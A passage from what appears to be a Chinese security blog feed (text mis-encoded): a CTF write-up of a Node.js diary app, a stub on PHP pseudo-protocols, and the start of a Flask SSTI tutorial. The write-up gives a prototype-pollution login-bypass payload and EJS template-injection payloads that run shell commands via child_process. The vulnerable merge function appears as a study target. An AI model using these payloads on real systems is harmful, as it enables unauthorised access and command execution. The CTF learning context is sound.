class="string">&#x27;randomatic&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="comment">// Prevent prototype pollution</span></span><br><span class="line">        <span class="keyword">if</span> (key === <span class="string">&#x27;__proto__&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Detected Prototype Pollution&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">    .<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;))</span><br><span class="line">    .<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&quot;./views&quot;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;session&#x27;</span>,</span><br><span class="line">    <span class="attr">secret</span>: <span class="title function_">randomize</span>(<span class="string">&#x27;aA0&#x27;</span>, <span class="number">16</span>),</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">false</span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&quot;/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// save userinfo to session</span></span><br><span class="line">        <span class="keyword">let</span> data = &#123;&#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title function_">merge</span>(data, req.<span class="property">body</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;login&quot;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;Don&#x27;t pollution my shared diary!&quot;</span>&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">data</span> = data</span><br><span class="line"></span><br><span class="line">        <span class="comment">// check password</span></span><br><span class="line">        <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">        user.<span class="property">password</span> = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">        <span class="keyword">if</span> (user.<span class="property">password</span>=== <span class="string">&quot;testpassword&quot;</span>) &#123;</span><br><span class="line">            user.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (user.<span class="property">role</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;login&quot;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;Login as admin or don&#x27;t touch my shared diary!&quot;</span>&#125;)</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;&quot;</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">data</span> || !req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span> || req.<span class="property">session</span>.<span class="property">role</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> diary = ejs.<span class="title function_">render</span>(<span class="string">`&lt;div&gt;<span class="subst">$&#123;req.body.diary&#125;</span>&lt;/div&gt;`</span>)</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">diary</span> = diary</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;diary&#x27;</span>, &#123;<span class="attr">diary</span>: req.<span class="property">session</span>.<span class="property">diary</span>, <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;diary&#x27;</span>, &#123;<span class="attr">diary</span>: req.<span class="property">session</span>.<span class="property">diary</span>, <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8888</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>);</span><br></pre></td></tr></table></figure><br>å¯ä»¥å‘ç°è¯¥ç½‘ç«™æœ‰ä¸¤ä¸ªè·¯ç”±åˆ†åˆ«ä¸º/å’Œ/loginæˆ‘ä»¬æŸ¥çœ‹/loginè·¯ç”±çš„å‡½æ•°<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">all</span>(<span class="string">&quot;/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// save userinfo to session</span></span><br><span class="line">        <span class="keyword">let</span> data = &#123;&#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title function_">merge</span>(data, req.<span class="property">body</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;login&quot;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;Don&#x27;t pollution my shared diary!&quot;</span>&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">data</span> = data</span><br><span class="line"></span><br><span class="line">        <span class="comment">// check password</span></span><br><span class="line">        <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">        user.<span class="property">password</span> = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">        <span class="keyword">if</span> (user.<span class="property">password</span>=== <span class="string">&quot;testpassword&quot;</span>) &#123;</span><br><span class="line">            user.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (user.<span class="property">role</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;login&quot;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;Login as admin or don&#x27;t touch my shared diary!&quot;</span>&#125;)</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;&quot;</span>&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><br>å¯ä»¥å‘ç°å…¶è°ƒç”¨äº†merge()å‡½æ•°å°†æˆ‘ä»¬ä¼ å…¥çš„bodyæ‹¼æ¥åˆ°ä¸€ä¸ªç©ºå¯¹è±¡dataä¸Šæˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹mergeå‡½æ•°<br><img src="/2024/01/28/%E5%88%9D%E6%8E%A2JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/6.png" class="" title="Alt text"><br>æˆ‘ä»¬å¯ä»¥å‘ç°<code>target[key] = source[key]</code>é‚£ä¹ˆå¾ˆæ˜æ˜¾è¿™åº”è¯¥æ˜¯ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ã€‚é‚£ä¹ˆæˆ‘ä»¬åªè¦æ§åˆ¶sourceä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„bodyå¯¹åŸå‹é“¾è¿›è¡Œä¿®æ”¹å³å¯ï¼Œä½†æ˜¯å‡½æ•°å°†<strong>proto</strong>è¿›è¡Œäº†è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>&#123;constructor:&#123;prototype:&#123;&#125;&#125;&#125;</code>æ¥æŒ‡å‘å…¶åŸå‹</p><p>ç»§ç»­åˆ†ææºç ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°å…¶å°†dataä¼ åˆ°äº†req.session.dataï¼Œä¹‹ååªè¦<code>user.role===admin</code>å°±å¯ä»¥è·³åˆ°<code>/</code>è·¯ç”±ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åŸå‹é“¾æ±¡æŸ“ï¼Œå› ä¸ºuserçš„åŸå‹ä¸dataçš„åŸå‹éƒ½ä¸ºObject.prototypeé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç»™åŸå‹ä¼ å…¥ä¸€ä¸ªroleä¸ºadminè¿™æ ·å°±å¯ä»¥ç»•è¿‡ç™»é™†è·¯è§£ç åˆ°è¾¾<code>/</code>è·¯ç”±</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">data</span> || !req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span> || req.<span class="property">session</span>.<span class="property">role</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> diary = ejs.<span class="title function_">render</span>(<span class="string">`&lt;div&gt;<span class="subst">$&#123;req.body.diary&#125;</span>&lt;/div&gt;`</span>)</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">diary</span> = diary</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;diary&#x27;</span>, &#123;<span class="attr">diary</span>: req.<span class="property">session</span>.<span class="property">diary</span>, <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;diary&#x27;</span>, &#123;<span class="attr">diary</span>: req.<span class="property">session</span>.<span class="property">diary</span>, <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>&#125;);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè·¯ç”±æˆ‘ä»¬åˆ†æä¸€ä¸‹ï¼Œå‘ç°å¦‚æœ<code>req.session.data</code>ï¼Œ<code>req.session.data.username</code>ä¸ºç©ºæˆ–è€…<code>req.session.role</code> ä¸ä¸ºadminçš„è¯ä¼šè·³è½¬åˆ°ç™»é™†ç•Œé¢ã€‚æ‰€ä»¥é™¤äº†ä¼ å…¥æˆ‘ä»¬è¦ä¿®æ”¹çš„åŸå‹é“¾çš„å€¼ï¼Œè¿˜è¦ä¼ å…¥usernameï¼Œç»•è¿‡ç™»é™†çš„payloadå¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;role&quot;:&quot;admin&quot;&#125;&#125;,&quot;username&quot;:&quot;lsss&quot;&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/01/28/%E5%88%9D%E6%8E%A2JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/7.png" class="" title="Alt text"><br>æ”¾åŒ…åæˆåŠŸç»•è¿‡ç™»é™†<br>ä¹‹åæˆ‘ä»¬ç»§ç»­æŸ¥çœ‹æºç <br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> diary = ejs.<span class="title function_">render</span>(<span class="string">`&lt;div&gt;<span class="subst">$&#123;req.body.diary&#125;</span>&lt;/div&gt;`</span>)</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">diary</span> = diary</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;diary&#x27;</span>, &#123;<span class="attr">diary</span>: req.<span class="property">session</span>.<span class="property">diary</span>, <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>&#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶ä½¿ç”¨äº†ejsæ¡†æ¶ï¼Œç›´æ¥å°†å˜é‡req.body.diaryå¡åˆ°æ¡†æ¶é‡Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ejsçš„sstiæ¨¡æ¿æ³¨å…¥æ³¨å…¥è¯­å¥åœ¨ç½‘ä¸Šä¸€æŸ¥å°±èƒ½æŸ¥åˆ°<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;ls /&#x27;) %&gt;</span><br><span class="line">&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat</span><br><span class="line">/flag&#x27;) %&gt;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> node.js </category>
          
          <category> åŸå‹é“¾æ±¡æŸ“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸå‹é“¾æ±¡æŸ“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpä¼ªåè®®</title>
      <link href="/2024/01/21/php%E4%BC%AA%E5%8D%8F%E8%AE%AE-1/"/>
      <url>/2024/01/21/php%E4%BC%AA%E5%8D%8F%E8%AE%AE-1/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯phpä¼ªåè®®"><a href="#ä»€ä¹ˆæ˜¯phpä¼ªåè®®" class="headerlink" title="ä»€ä¹ˆæ˜¯phpä¼ªåè®®"></a>ä»€ä¹ˆæ˜¯phpä¼ªåè®®</h1>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
          <category> æ–‡ä»¶åŒ…å« </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sstiæ¨¡æ¿æ³¨å…¥</title>
      <link href="/2024/01/19/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/01/19/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="flaskæ¡†æ¶"><a href="#flaskæ¡†æ¶" class="headerlink" title="flaskæ¡†æ¶"></a>flaskæ¡†æ¶</h1><p>Flaskæ˜¯ä¸€ä¸ªPythonç¼–å†™çš„Web å¾®æ¡†æ¶ï¼Œè®©æˆ‘ä»¬å¯ä»¥ä½¿ç”¨Pythonè¯­è¨€å¿«é€Ÿå®ç°ä¸€ä¸ªç½‘ç«™æˆ–WebæœåŠ¡ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨flaskæ¡†æ¶æ¥å¿«é€Ÿæ­å»ºweb</p><h2 id="flakæ¡†æ¶åŸºç¡€ä»£ç "><a href="#flakæ¡†æ¶åŸºç¡€ä»£ç " class="headerlink" title="flakæ¡†æ¶åŸºç¡€ä»£ç "></a>flakæ¡†æ¶åŸºç¡€ä»£ç </h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask<span class="comment">#ä»flaskæ¨¡å—é‡Œå¯¼å…¥Flaskç±»</span></span><br><span class="line">app = Flask(__name__)<span class="comment">#åˆ›å»º</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span><span class="comment">#è·¯ç”±è§„åˆ™</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello1</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/lll&#x27;</span></span>)</span><span class="comment">#é™æ€è·¯ç”±</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello2</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello lll&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;name&gt;&#x27;</span></span>)</span><span class="comment">#åŠ¨æ€è·¯ç”±</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello2</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello %s&quot;</span> % name</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/id/&lt;int:ID&gt;&#x27;</span></span>)</span><span class="comment">#å˜é‡ä¸ºintå‹çš„åŠ¨æ€è·¯ç”±</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ID</span>(<span class="params">ID</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;you ID is %d&#x27;</span>%ID</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/num/&lt;float:num&gt;&#x27;</span></span>)</span><span class="comment">#floatå‹åŠ¨æ€è·¯ç”±</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">num</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;you num is %f&#x27;</span> % num</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,debug=<span class="literal">True</span>)<span class="comment">#å¼€å¯debugï¼Œhostç«¯å£å…¨ç›‘æ§</span></span><br></pre></td></tr></table></figure><h2 id="ä»£ç è§£æ"><a href="#ä»£ç è§£æ" class="headerlink" title="ä»£ç è§£æ"></a>ä»£ç è§£æ</h2><h3 id="routeè·¯ç”±"><a href="#routeè·¯ç”±" class="headerlink" title="routeè·¯ç”±"></a>routeè·¯ç”±</h3><p>ä½¿ç”¨@app.route(â€˜/â€˜)æ¥å®šä¹‰è·¯ç”±ï¼Œè·¯ç”±åˆ†ä¸ºé™æ€è·¯ç”±ä¸åŠ¨æ€è·¯ç”±ï¼Œé™æ€è·¯ç”±å¦‚<code>@app.route(&#39;/lll&#39;)</code>åªæœ‰æœç´¢/lllæ‰ä¼šè§¦å‘<br>åŠ¨æ€è·¯ç”±å¦‚<code>@app.route(&#39;/&lt;name&gt;&#39;)</code>é€šè¿‡&lt;&gt;åœ¨/åæ’å…¥å˜é‡nameåªè¦è®¿é—®/åŠ ä¸Šä»»æ„å­—ç¬¦å³å¯è§¦å‘<br>å½“è·¯ç”±è§¦å‘æ—¶ä¼šæ‰§è¡Œè·¯ç”±ä¸‹å®šä¹‰å¥½çš„å‡½æ•°ï¼ŒåŠ¨æ€è·¯ç”±å¯ä»¥å°†è·¯ç”±çš„å‚æ•°ä¼ åˆ°å‡½æ•°ä¸­å¦‚<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;name&gt;&#x27;</span></span>)</span><span class="comment">#åŠ¨æ€è·¯ç”±</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello2</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello %s&quot;</span> % name</span><br></pre></td></tr></table></figure><br>ä¼šå°†/åçš„ä½œä¸ºå‚æ•°ä¼ é€åˆ°hell2(name)å‡½æ•°çš„nameé‡Œï¼Œè¿™ä½¿ç”¨å‡½æ•°è¿”å›hello nameï¼Œä¼šç›´æ¥è¿”å›åˆ°webé‡Œå¦‚ä¸‹<br><img src="/2024/01/19/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/1.png" class="" title="Alt text"></p><h3 id="httpæ–¹æ³•ï¼Œredirecté‡å®šå‘ï¼Œrender-template"><a href="#httpæ–¹æ³•ï¼Œredirecté‡å®šå‘ï¼Œrender-template" class="headerlink" title="httpæ–¹æ³•ï¼Œredirecté‡å®šå‘ï¼Œrender_template"></a>httpæ–¹æ³•ï¼Œredirecté‡å®šå‘ï¼Œrender_template</h3><p>GETå’Œpostæ–¹æ³•<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)<span class="comment">#è¿”å›htmlç›¸å½“äºç›´æ¥è¿”å›index.htmlè¿™ä¸ªæ¨¡æ¿</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span><span class="comment">#ä¼ å‚æ¨¡å¼ä¸ºpostå’Œget</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_page</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name=request.form[<span class="string">&#x27;lss&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;name&#x27;</span>, name1=name))<span class="comment">#è‹¥ä¸ºpoståˆ™ä½¿ç”¨redirecté‡å®šå‘é…åˆurl_forå°†å…¶å®šå‘åˆ°/nameä¸‹ï¼Œä¼ é€’å‚æ•°name1=name name1ä¸º/name/&lt;name1&gt;çš„å‚æ•°name1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        name=request.args.get(<span class="string">&#x27;lss&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;name&#x27;</span>, name1=name))</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/name/&lt;name1&gt;&#x27;</span></span>)</span><span class="comment">#æ¥æ”¶redirectä¼ æ¥çš„å‚æ•°name1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name</span>(<span class="params">name1</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello %s&quot;</span> %name1</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>,host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#index.html</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:5000/login&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>è¾“å…¥ä½ çš„åå­—:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;lss&quot;</span>/&gt;</span> <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Redirecté‡å®šå‘ç›¸å½“äºé¡µé¢è·³è½¬</p><h2 id="flaskæ¨¡æ¿"><a href="#flaskæ¨¡æ¿" class="headerlink" 